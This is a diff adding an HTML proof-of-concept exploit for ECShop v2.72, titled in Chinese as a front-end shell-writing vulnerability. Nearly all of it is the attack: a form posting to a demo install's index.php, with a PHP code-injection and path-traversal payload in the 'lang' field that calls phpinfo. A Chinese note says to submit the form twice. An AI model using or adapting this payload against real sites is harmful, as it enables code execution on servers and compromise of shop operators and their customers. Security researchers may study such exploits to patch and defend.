@@ -1,0 +1,14 @@
+<title>ecshop v2.72 前台写shell漏洞 </title> 
+<form method="post" name="register" action="http://127.1/ecshop2.72/demo/index.php">
+
+<h3>ecshop v2.72 前台写shell漏洞</h3>利用方试：提交两次，第二次内容任意</br>
+
+<input type="text" name="lang" size="80" value="');phpinfo();(_1_/../../../index" />
+
+<input type="hidden" name="step" value="readme" />
+
+<button type="submit" name="regsubmit" value="true">提交</button>
+
+</form> 
+
+
